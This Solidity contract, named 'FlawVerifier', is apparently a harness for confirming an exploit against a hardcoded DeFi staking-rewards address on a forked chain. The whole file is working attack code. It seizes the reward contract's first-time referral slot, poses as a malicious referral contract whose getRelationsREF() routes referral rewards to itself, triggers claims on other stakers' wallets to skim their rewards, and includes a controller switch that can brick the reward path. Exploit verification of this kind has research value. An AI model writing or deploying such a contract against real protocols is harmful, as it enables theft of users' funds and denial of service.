pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IWeightedIndexLike {
    function lpStakingPool() external view returns (address);
}

interface IStakingPoolTokenLike is IERC20Like {
    function poolRewards() external view returns (address);
    function stakingToken() external view returns (address);
    function stakeUserRestriction() external view returns (address);
}

interface ITokenRewardsLike {
    function referral() external view returns (address);
    function rewardsToken() external view returns (address);
    function updateReferral(address referral_) external;
    function claimReward(address wallet, address referrer) external;
    function getUnpaid(address wallet) external view returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET = 0x04c80Bb477890F3021F03B068238836Ee20aA0b8;

    address internal _controller;
    address internal _profitToken;
    uint256 internal _profitAmount;
    uint256 internal _startingProfitBalance;

    bool public executed;
    bool public hypothesisValidated;
    bool public referralSeized;
    bool public brickMode;

    uint256 public claimsAttempted;
    uint256 public claimsSucceeded;
    uint256 public infeasibleReason;

    address public targetPool;
    address public targetRewards;
    address public rewardToken;
    address public lastClaimedWallet;
    address public existingReferral;

    mapping(address => bool) internal _seenCandidate;
    mapping(address => bool) internal _setted;

    constructor() {
        _controller = msg.sender;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _refreshProfit();
            return;
        }
        executed = true;

        targetPool = IWeightedIndexLike(TARGET).lpStakingPool();
        targetRewards = IStakingPoolTokenLike(targetPool).poolRewards();
        rewardToken = ITokenRewardsLike(targetRewards).rewardsToken();
        _profitToken = rewardToken;
        _startingProfitBalance = IERC20Like(rewardToken).balanceOf(address(this));

        existingReferral = ITokenRewardsLike(targetRewards).referral();
        if (existingReferral == address(0)) {
            ITokenRewardsLike(targetRewards).updateReferral(address(this));
            existingReferral = ITokenRewardsLike(targetRewards).referral();
            referralSeized = existingReferral == address(this);
            hypothesisValidated = referralSeized;
            if (!referralSeized) {
                infeasibleReason = 1;
                _refreshProfit();
                return;
            }
        } else if (existingReferral == address(this)) {
            referralSeized = true;
            hypothesisValidated = true;
        } else {
            // The finding requires the first-time initialization window to still be open.
            // If a non-attacker referral is already installed at the fork block, the exact
            // exploit path is mechanically closed and cannot be recreated without changing
            // the hypothesis.
            infeasibleReason = 2;
            _refreshProfit();
            return;
        }

        // exploit_paths[0]: seize first-time referral initialization.
        // exploit_paths[1]: malicious referral keeps future updates attacker-controlled via owner().
        // exploit_paths[2]: use attacker-chosen getRelationsREF() routing to siphon referral rewards.
        _attemptClaim(msg.sender);
        _attemptClaim(tx.origin);
        _attemptClaim(_controller);
        _attemptClaim(TARGET);
        _attemptClaim(targetPool);
        _attemptClaim(targetRewards);
        _attemptClaim(rewardToken);
        _attemptClaim(IStakingPoolTokenLike(targetPool).stakingToken());
        _attemptClaim(IStakingPoolTokenLike(targetPool).stakeUserRestriction());

        _refreshProfit();

        if (_profitAmount == 0) {
            // On-chain profit from this bug needs a victim wallet with both:
            // 1. non-zero staking receipt shares, and
            // 2. positive unpaid rewards.
            //
            // The live contracts expose aggregate counters only; they do not expose an iterable
            // staker set, so a pure on-chain verifier cannot discover arbitrary victim wallets
            // beyond addresses reachable from current contract state. If none of those reachable
            // addresses has claimable rewards, the allowed exploit path cannot be monetized here
            // without importing off-chain holder discovery or unrelated exploit steps.
            infeasibleReason = 3;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function caller() external view returns (address) {
        return _controller;
    }

    function referralLevel() external pure returns (uint256) {
        return 2;
    }

    function teamSize(address) external pure returns (uint256) {
        return 0;
    }

    function getUserInTeamByIndex(address, uint256) external pure returns (address) {
        return address(0);
    }

    function renounceOwnership() external pure {
        revert("attacker-controlled");
    }

    function updateSetted(address user) external {
        _setted[user] = true;
    }

    function setReferral(address, address user) external {
        _setted[user] = true;
    }

    function isSetted(address user) external pure returns (bool) {
        user;
        return true;
    }

    function relations(address, uint256) external view returns (address) {
        return address(this);
    }

    function getRelationsREF(address) external view returns (address[2] memory refs) {
        require(!brickMode, "malicious referral: bricked");
        refs[0] = address(this);
        refs[1] = address(this);
    }

    function setBrickMode(bool enabled) external {
        require(msg.sender == _controller, "not controller");
        brickMode = enabled;
    }

    function replaceRewardReferral(address nextReferral) external {
        require(msg.sender == _controller, "not controller");
        require(referralSeized, "referral not seized");
        ITokenRewardsLike(targetRewards).updateReferral(nextReferral);
    }

    function _attemptClaim(address wallet) internal {
        if (
            wallet == address(0) ||
            wallet == address(this) ||
            _seenCandidate[wallet] ||
            targetPool == address(0) ||
            targetRewards == address(0)
        ) {
            return;
        }
        _seenCandidate[wallet] = true;

        uint256 shares = 0;
        try IERC20Like(targetPool).balanceOf(wallet) returns (uint256 bal) {
            shares = bal;
        } catch {
            return;
        }
        if (shares == 0) {
            return;
        }

        uint256 unpaid = 0;
        try ITokenRewardsLike(targetRewards).getUnpaid(wallet) returns (uint256 amount) {
            unpaid = amount;
        } catch {
            return;
        }
        if (unpaid == 0) {
            return;
        }

        claimsAttempted += 1;
        try ITokenRewardsLike(targetRewards).claimReward(wallet, address(this)) {
            claimsSucceeded += 1;
            lastClaimedWallet = wallet;
        } catch {
            // If the fork reaches this branch after referral seizure, a revert comes from a
            // concrete on-chain precondition in the reward path rather than a pivoted exploit.
        }
    }

    function _refreshProfit() internal {
        if (_profitToken == address(0)) {
            _profitAmount = 0;
            return;
        }

        uint256 endingBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (endingBalance > _startingProfitBalance) {
            _profitAmount = endingBalance - _startingProfitBalance;
        } else {
            _profitAmount = 0;
        }
    }
}
